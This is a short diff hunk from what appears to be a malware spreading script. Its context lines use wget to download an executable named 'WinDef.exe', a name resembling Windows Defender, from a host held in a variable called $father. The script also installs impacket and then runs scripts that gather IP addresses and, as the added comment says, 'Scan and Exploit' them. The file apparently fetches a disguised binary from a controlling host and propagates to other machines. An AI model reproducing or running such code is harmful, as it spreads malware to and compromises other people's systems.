@@ -51,10 +51,10 @@ python -m pip  install impacket
 $Location = '' + $save_dir + '\' + 'WinDef.exe';
 Start-Process -FilePath $wgetBinLocation -Args " http://$father/WinDef.exe -O $Location" -passthru -NoNewWindow -Wait
 
-
+# Get all valid IPs
 python getIPs.py
+# Scan and Exploit
 python scan.py
-
 
 
 #$filename = "wget.exe"
